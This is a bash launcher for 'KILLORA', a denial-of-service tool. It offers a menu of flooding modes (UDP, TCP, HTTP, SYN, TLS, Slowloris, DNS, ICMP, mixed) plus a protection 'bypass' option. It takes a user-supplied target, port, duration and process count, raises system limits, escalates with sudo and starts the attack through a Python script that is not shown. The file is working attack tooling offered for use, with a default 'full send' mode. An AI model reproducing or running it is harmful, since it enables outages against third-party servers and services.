#!/usr/bin/env bash
# KILLORA by BrokenCodeZ
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PY="$DIR/killora.py"
C1='\033[1;36m'; C2='\033[1;35m'; C3='\033[1;33m'
C4='\033[1;32m'; CR='\033[1;31m'; DM='\033[2m'; N='\033[0m'

banner() {
  clear
  printf "${C2}"
  cat <<'EOF'
   __ __ _ _ _      ___  ___  ___  _   _
  |  |  | | | | ___| . |  _| . | | | |
  |    <| | | ||___| | | | | | | |_| |
  |_|\__|_____|    |___|_| |___|_____|
EOF
  printf "${N}"
  printf "        ${C1}K I L L O R A${N}  ${DM}by BrokenCodeZ${N}\n\n"
}

need() { command -v "$1" >/dev/null 2>&1; }

boot() {
  need python3 || { apt-get update -qq && apt-get install -y python3; } 2>/dev/null
  need python3 || { printf "${CR}python3 missing${N}\n"; exit 1; }
  [ -f "$PY" ] || { printf "${CR}killora.py missing${N}\n"; exit 1; }
}

banner
boot

printf "  ${C4}[ ENTER ]${N} = AUTO FULL SEND  ${DM}(sab vectors, bypass auto)${N}\n"
printf "  ${DM}ya mode chuno:${N}\n\n"
printf "  ${C3}[1]${N} UDP      ${C3}[2]${N} TCP      ${C3}[3]${N} HTTP\n"
printf "  ${C3}[4]${N} SYN      ${C3}[5]${N} TLS      ${C3}[6]${N} Slowloris\n"
printf "  ${C3}[7]${N} DNS      ${C3}[8]${N} ICMP     ${C3}[9]${N} Mixed\n"
printf "  ${C3}[10]${N} Tunnel Bypass     ${C3}[11]${N} Checker\n"
printf "  ${CR}[0]${N} Exit\n\n"

read -rp "  ${C1}Killora >${N} " OPT
case "$OPT" in
  "") MODE=auto;;
  1) MODE=udp;; 2) MODE=tcp;; 3) MODE=http;; 4) MODE=syn;;
  5) MODE=tls;; 6) MODE=slow;; 7) MODE=dns;; 8) MODE=icmp;;
  9) MODE=mixed;; 10) MODE=tunnel;; 11) MODE=check;;
  0) exit 0;; *) MODE=auto;;
esac

banner
while :; do
  read -rp "  Target (IP / host / URL): " RAW
  [ -n "$RAW" ] && break
done
RAW="${RAW#http://}"; RAW="${RAW#https://}"; RAW="${RAW%%/*}"
HOST="$RAW"

if [ "$MODE" = "check" ]; then
  exec python3 "$PY" check "$HOST" 0 0 5 1
fi

CPU=$(nproc 2>/dev/null || echo 2)

if [ "$MODE" = "auto" ]; then
  PORT=443; COUNT=0; DUR="${KILLORA_DUR:-60}"; PROCS="$CPU"
  printf "\n  ${C4}%s${N} -> ${C4}full send${N}  ${DM}%d procs, %ss, auto bypass${N}\n" \
    "$HOST" "$PROCS" "$DUR"
else
  DEF=80; [ "$MODE" = "tls" ] && DEF=443; [ "$MODE" = "dns" ] && DEF=53
  [ "$MODE" = "tunnel" ] && DEF=443
  read -rp "  Port [$DEF]: " PORT; PORT="${PORT:-$DEF}"
  read -rp "  Count (0=unlimited): " COUNT; COUNT="${COUNT:-0}"
  read -rp "  Duration sec [60]: " DUR; DUR="${DUR:-60}"
  read -rp "  Procs [$CPU]: " PROCS; PROCS="${PROCS:-$CPU}"
fi

ulimit -n 1048576 2>/dev/null
printf "\n  ${C3}ENTER = launch${N}"
read -r _

if [ "$EUID" -ne 0 ]; then
  exec sudo -E python3 "$PY" "$MODE" "$HOST" "$PORT" "$COUNT" "$DUR" "$PROCS"
fi
exec python3 "$PY" "$MODE" "$HOST" "$PORT" "$COUNT" "$DUR" "$PROCS"